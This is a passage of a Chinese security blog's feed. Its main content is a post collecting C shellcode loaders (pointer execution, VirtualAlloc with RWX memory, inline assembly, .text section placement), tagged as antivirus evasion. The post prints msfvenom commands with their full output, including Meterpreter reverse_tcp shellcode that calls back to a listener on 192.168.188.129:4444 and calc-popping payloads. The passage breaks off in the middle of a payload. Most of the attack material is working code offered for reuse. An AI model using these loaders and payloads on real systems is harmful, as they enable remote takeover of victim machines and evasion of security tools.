显示调试器启动文件的路径</p></li><li><p>.formats：显示数字的各种格式信息</p><figure><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409154225866.png" alt="image-20220409154225866"><figcaption aria-hidden="true">image-20220409154225866</figcaption></figure></li><li><p>.cls：清屏</p></li><li><p>ld：加载指定或者所有模块的符号</p><figure><img src="/2022/04/09/WinDbg%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/image-20220409154421965.png" alt="image-20220409154421965"><figcaption aria-hidden="true">image-20220409154421965</figcaption></figure></li><li><p>lm：显示所有加载和未加载的模块信息</p></li></ul><h2 id="ring0">ring0</h2><p>额命令啥的先不写了，太多了，之后补充</p><blockquote><p>https://www.cnblogs.com/gaochundong/p/windbg_cheat_sheet.html</p><p>https://www.cnblogs.com/kekec/archive/2012/12/02/2798020.html</p><p>https://www.kanxue.com/book-8-62.htm#</p><p>https://www.cnblogs.com/DarkBright/p/10843698.html</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;双机调试&quot;&gt;双机调试&lt;/h1&gt;
&lt;p&gt;虚拟机添加串行端口：（如果发现建立的串行端口一直是串行端口2，则把虚拟机硬件中的打印机删除即可创建串行端口1）&lt;/p&gt;
&lt;figure&gt;
&lt;img src=&quot;/2022/04/09/WinDb</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="内核" scheme="https://ghostasky.github.io/tags/%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>回调函数加载shellcode</title>
    <link href="https://ghostasky.github.io/2022/04/09/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E5%8A%A0%E8%BD%BDshellcode/"/>
    <id>https://ghostasky.github.io/2022/04/09/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E5%8A%A0%E8%BD%BDshellcode/</id>
    <published>2022-04-08T16:00:00.000Z</published>
    <updated>2022-07-12T06:20:36.665Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="哥,别试了" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="9c14c29a873c19aee424e783624f7be73ef4ab392f1d84ca271ae9627fb1241a">994f9c06d970fb4aead1c76eb2a7916e14b9466af8aee544a618a637115cb50a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">密码不记得，只有本地有</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="免杀" scheme="https://ghostasky.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>ShellCode Loader(持续更新)</title>
    <link href="https://ghostasky.github.io/2022/04/08/ShellCodeLoader/"/>
    <id>https://ghostasky.github.io/2022/04/08/ShellCodeLoader/</id>
    <published>2022-04-07T16:00:00.000Z</published>
    <updated>2022-07-12T06:28:10.940Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些语言的shellcode 加载方式，持续更新...</p><p>[toc]</p><h1 id="cc">C/C++</h1><p>首先是c的loader，分两种，指针直接执行和动态分配。</p><h2 id="指针执行">指针执行</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//设置入口地址，不弹出黑窗口</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//都可</span></span><br><span class="line"><span class="comment">//((void(*)()) &amp;shellcode)();</span></span><br><span class="line">    <span class="comment">//(*(void(*)()) &amp;shellcode)();</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//也可以这样</span></span><br><span class="line"> <span class="comment">//void (*func)();</span></span><br><span class="line">    <span class="comment">//func = (void (*)())(void *)shellcode;</span></span><br><span class="line">    <span class="comment">//func();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态分配">动态分配</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PVOID Memory;</span><br><span class="line">    Memory = VirtualAlloc(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(shellcode),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">//动态分配虚地址空间</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory,buf,<span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="comment">//复制内存内容</span></span><br><span class="line">    ((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内联汇编">内联汇编</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/section:.data,RWE&quot;</span>)  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        jmp eax</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="写到text段">写到text段</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> section(<span class="meta-string">&quot;.text&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">__declspec(allocate(<span class="string">&quot;.text&quot;</span>)) <span class="keyword">char</span> shellcode[] =</span><br><span class="line">    <span class="string">&quot;\xba\x9f\x20\x22\xd2\xda\xd4\xd9\x74\x24\xf4\x5f\x33\xc9\xb1&quot;</span></span><br><span class="line">    <span class="string">&quot;\x30\x83\xc7\x04\x31\x57\x0f\x03\x57\x90\xc2\xd7\x2e\x46\x80&quot;</span></span><br><span class="line">    <span class="string">&quot;\x18\xcf\x96\xe5\x91\x2a\xa7\x25\xc5\x3f\x97\x95\x8d\x12\x1b&quot;</span></span><br><span class="line">    <span class="string">&quot;\x5d\xc3\x86\xa8\x13\xcc\xa9\x19\x99\x2a\x87\x9a\xb2\x0f\x86&quot;</span></span><br><span class="line">    <span class="string">&quot;\x18\xc9\x43\x68\x21\x02\x96\x69\x66\x7f\x5b\x3b\x3f\x0b\xce&quot;</span></span><br><span class="line">    <span class="string">&quot;\xac\x34\x41\xd3\x47\x06\x47\x53\xbb\xde\x66\x72\x6a\x55\x31&quot;</span></span><br><span class="line">    <span class="string">&quot;\x54\x8c\xba\x49\xdd\x96\xdf\x74\x97\x2d\x2b\x02\x26\xe4\x62&quot;</span></span><br><span class="line">    <span class="string">&quot;\xeb\x85\xc9\x4b\x1e\xd7\x0e\x6b\xc1\xa2\x66\x88\x7c\xb5\xbc&quot;</span></span><br><span class="line">    <span class="string">&quot;\xf3\x5a\x30\x27\x53\x28\xe2\x83\x62\xfd\x75\x47\x68\x4a\xf1&quot;</span></span><br><span class="line">    <span class="string">&quot;\x0f\x6c\x4d\xd6\x3b\x88\xc6\xd9\xeb\x19\x9c\xfd\x2f\x42\x46&quot;</span></span><br><span class="line">    <span class="string">&quot;\x9f\x76\x2e\x29\xa0\x69\x91\x96\x04\xe1\x3f\xc2\x34\xa8\x55&quot;</span></span><br><span class="line">    <span class="string">&quot;\x15\xca\xd6\x1b\x15\xd4\xd8\x0b\x7e\xe5\x53\xc4\xf9\xfa\xb1&quot;</span></span><br><span class="line">    <span class="string">&quot;\xa1\xf6\xb0\x98\x83\x9e\x1c\x49\x96\xc2\x9e\xa7\xd4\xfa\x1c&quot;</span></span><br><span class="line">    <span class="string">&quot;\x42\xa4\xf8\x3d\x27\xa1\x45\xfa\xdb\xdb\xd6\x6f\xdc\x48\xd6&quot;</span></span><br><span class="line">    <span class="string">&quot;\xa5\xbf\x0f\x44\x25\x40&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    (*(<span class="keyword">void</span> (*)())(&amp;shellcode))();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="shellcode">shellcode</h1><p>到kali机的，(自用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.188</span><span class="number">.129</span> LPORT=<span class="number">4444</span> -a x86 --platform Windows -f c  </span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: <span class="number">354</span> bytes</span><br><span class="line">Final size of c file: <span class="number">1512</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x8b\x52\x14\x89\xe5\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xef\x52\x8b\x52\x10\x57\x8b\x42\x3c\x01\xd0\x8b\x40\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34\x8b\x01\xd6\x31\xc0\xac&quot;</span></span><br><span class="line"><span class="string">&quot;\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\xbc\x81\x68\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line">➜  ~ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.188</span><span class="number">.129</span> LPORT=<span class="number">4444</span> -a x86 --platform Windows -f c --bad <span class="string">&quot;\x00&quot;</span></span><br><span class="line">Found <span class="number">11</span> compatible encoders</span><br><span class="line">Attempting to encode payload with <span class="number">1</span> iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size <span class="number">381</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x86/shikata_ga_nai chosen with <span class="keyword">final</span> size <span class="number">381</span></span><br><span class="line">Payload size: <span class="number">381</span> bytes</span><br><span class="line">Final size of c file: <span class="number">1626</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xbb\xfb\xb4\xcc\x3f\xda\xd9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\x59\x31\x5a\x14\x83\xc2\x04\x03\x5a\x10\x19\x41\x30\xd7\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\xaa\xc9\x28\x0c\x9a\x1b\x4c\x47\x8e\xab\x04\xb2\xa4\x9e\x1a&quot;</span></span><br><span class="line"><span class="string">&quot;\xb7\xe9\x0a\xa8\xb5\x25\x3c\x19\x73\x10\x73\x9a\xb2\x9c\xdf&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\xd5\x60\x22\x8d\x35\x58\xed\xc0\x34\x9d\xbb\xaf\xd9\x73&quot;</span></span><br><span class="line"><span class="string">&quot;\x6b\xdb\x77\x64\x18\x99\x4b\x85\xce\x95\xf3\xfd\x6b\x69\x87&quot;</span></span><br><span class="line"><span class="string">&quot;\xb1\x72\xba\xec\x02\x6d\xb1\xaa\xb2\xdd\xc4\x99\x36\x14\xb2&quot;</span></span><br><span class="line"><span class="string">&quot;\x21\x08\x58\x72\xd2\x5e\x2d\x84\x32\xaf\xf1\x2b\x7b\x1f\xfc&quot;</span></span><br><span class="line"><span class="string">&quot;\x32\xbc\x98\x1f\x41\xb6\xda\xa2\x52\x0d\xa0\x78\xd6\x91\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x0a\x40\x75\xb2\xdf\x17\xfe\xb8\x94\x5c\x58\xdd\x2b\xb0\xd3&quot;</span></span><br><span class="line"><span class="string">&quot;\xd9\xa0\x37\x33\x68\xf2\x13\x97\x30\xa0\x3a\x8e\x9c\x07\x42&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x79\xf7\xe6\x9b\x68\xee\x97\x64\x73\x0f\xca\xf2\xbf\xc2&quot;</span></span><br><span class="line"><span class="string">&quot;\xf5\x02\xa8\x55\x85\x30\x77\xce\x01\x78\xf0\xc8\xd6\x09\x16&quot;</span></span><br><span class="line"><span class="string">&quot;\xeb\x09\xb1\x77\x15\xaa\xc1\x5e\xd2\xfe\x91\xc8\xf3\x7e\x7a&quot;</span></span><br><span class="line"><span class="string">&quot;\x09\xfb\xaa\x16\x03\x6b\x95\x4e\xaf\xea\x7d\x8c\xd0\xfd\x21&quot;</span></span><br><span class="line"><span class="string">&quot;\x19\x36\xad\x89\x49\xe7\x0e\x7a\x29\x57\xe7\x90\xa6\x88\x17&quot;</span></span><br><span class="line"><span class="string">&quot;\x9b\x6d\xa1\xb2\x74\xdb\x99\x2a\xec\x46\x51\xca\xf1\x5d\x1f&quot;</span></span><br><span class="line"><span class="string">&quot;\xcc\x7a\x57\xdf\x83\x8a\x12\xf3\xf4\xec\xdc\x0b\x05\x99\xdc&quot;</span></span><br><span class="line"><span class="string">&quot;\x61\x01\x0b\x8b\x1d\x0b\x6a\xfb\x81\xf4\x59\x78\xc5\x0b\x1c&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\xbd\x3a\x8a\xf4\xa9\x42\x5a\xf4\x29\x15\x30\xf4\x41\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\x60\xa7\x74\x0e\xbd\xd4\x24\x9b\x3e\x8c\x99\x0c\x57\x32\xc7&quot;</span></span><br><span class="line"><span class="string">&quot;\x7b\xf8\xcd\x22\xf8\xff\x31\xb0\xd7\xa7\x59\x4a\x68\x58\x99&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x68\x08\xf1\xbf\x47\xa7\x31\x3f\x42\xe0\x59\xca\x03\x42&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\xcb\x09\x02\xa4\xcc\xbe\x9f\x57\xb6\xcf\x20\x98\x47\xc6&quot;</span></span><br><span class="line"><span class="string">&quot;\x44\x99\x47\xe6\x7a\xa6\x91\xdf\x08\xe9\x21\x64\x02\x5c\x07&quot;</span></span><br><span class="line"><span class="string">&quot;\xcd\x89\x9e\x1b\x0d\x98&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="弹计算器">弹计算器</h2><h3 id="位">32位</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfvenom --payload windows/exec cmd=<span class="string">&quot;calc&quot;</span> --format c --arch x86 --platform windows --bad <span class="string">&quot;\x00&quot;</span> </span><br><span class="line">Found <span class="number">11</span> compatible encoders</span><br><span class="line">Attempting to encode payload with <span class="number">1</span> iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size <span class="number">216</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x86/shikata_ga_nai chosen with <span class="keyword">final</span> size <span class="number">216</span></span><br><span class="line">Payload size: <span class="number">216</span> bytes</span><br><span class="line">Final size of c file: <span class="number">933</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xba\x9f\x20\x22\xd2\xda\xd4\xd9\x74\x24\xf4\x5f\x33\xc9\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x83\xc7\x04\x31\x57\x0f\x03\x57\x90\xc2\xd7\x2e\x46\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\x18\xcf\x96\xe5\x91\x2a\xa7\x25\xc5\x3f\x97\x95\x8d\x12\x1b&quot;</span></span><br><span class="line"><span class="string">&quot;\x5d\xc3\x86\xa8\x13\xcc\xa9\x19\x99\x2a\x87\x9a\xb2\x0f\x86&quot;</span></span><br><span class="line"><span class="string">&quot;\x18\xc9\x43\x68\x21\x02\x96\x69\x66\x7f\x5b\x3b\x3f\x0b\xce&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x34\x41\xd3\x47\x06\x47\x53\xbb\xde\x66\x72\x6a\x55\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\x54\x8c\xba\x49\xdd\x96\xdf\x74\x97\x2d\x2b\x02\x26\xe4\x62&quot;</span></span><br><span class="line"><span class="string">&quot;\xeb\x85\xc9\x4b\x1e\xd7\x0e\x6b\xc1\xa2\x66\x88\x7c\xb5\xbc&quot;</span></span><br><span class="line"><span class="string">&quot;\xf3\x5a\x30\x27\x53\x28\xe2\x83\x62\xfd\x75\x47\x68\x4a\xf1&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\x6c\x4d\xd6\x3b\x88\xc6\xd9\xeb\x19\x9c\xfd\x2f\x42\x46&quot;</span></span><br><span class="line"><span class="string">&quot;\x9f\x76\x2e\x29\xa0\x69\x91\x96\x04\xe1\x3f\xc2\x34\xa8\x55&quot;</span></span><br><span class="line"><span class="string">&quot;\x15\xca\xd6\x1b\x15\xd4\xd8\x0b\x7e\xe5\x53\xc4\xf9\xfa\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\xa1\xf6\xb0\x98\x83\x9e\x1c\x49\x96\xc2\x9e\xa7\xd4\xfa\x1c&quot;</span></span><br><span class="line"><span class="string">&quot;\x42\xa4\xf8\x3d\x27\xa1\x45\xfa\xdb\xdb\xd6\x6f\xdc\x48\xd6&quot;</span></span><br><span class="line"><span class="string">&quot;\xa5\xbf\x0f\x44\x25\x40&quot;</span>;</span><br><span class="line"></span><br><span class="line">➜  ~ msfvenom --payload windows/exec cmd=<span class="string">&quot;calc&quot;</span> --format c --arch x86 --platform windows              </span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: <span class="number">189</span> bytes</span><br><span class="line">Final size of c file: <span class="number">819</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span></span><br><span class="line"><span class="string">&quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot;</span></span><br><span class="line"><span 